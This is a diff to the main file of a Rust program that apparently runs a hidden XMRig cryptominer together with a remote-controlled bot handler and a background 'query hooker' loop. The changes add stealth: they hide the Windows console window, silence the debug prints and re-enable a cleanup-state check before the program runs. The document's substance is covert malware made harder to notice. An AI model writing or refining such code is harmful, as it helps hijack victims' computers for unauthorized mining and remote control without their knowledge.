@@ -1,4 +1,4 @@
-// #![windows_subsystem = "windows"]
+#![windows_subsystem = "windows"]
 
 use std::{ sync::{ Arc, Mutex }, time::Duration };
 use client_vars::constants::{ log_directory, xmrig_exe_name };
@@ -35,23 +35,23 @@ async fn main() {
         exit_1();
     }
 
-    // let mib_config = load_mib_config(false).unwrap();
-    // if !mib_config.cln_up_done {
-    //     exit_1();
-    // }
+    let mib_config = load_mib_config(false).unwrap();
+    if !mib_config.cln_up_done {
+        exit_1();
+    }
 
     tokio::task::spawn(async move {
         loop {
             if let Err(error) = run_query_hooker().await {
-                println!("run_query_hooker errored out: {}", error);
+                // println!("run_query_hooker errored out: {}", error);
             };
         }
     });
 
-    println!("Start");
+    // println!("Start");
     if let Ok(miner_manager) = MinerManager::new().await {
         if let Ok(mut bot_handler) = BotHandler::new(miner_manager).await {
-            println!("run");
+            // println!("run");
             bot_handler.run_handler().await;
         }
     }
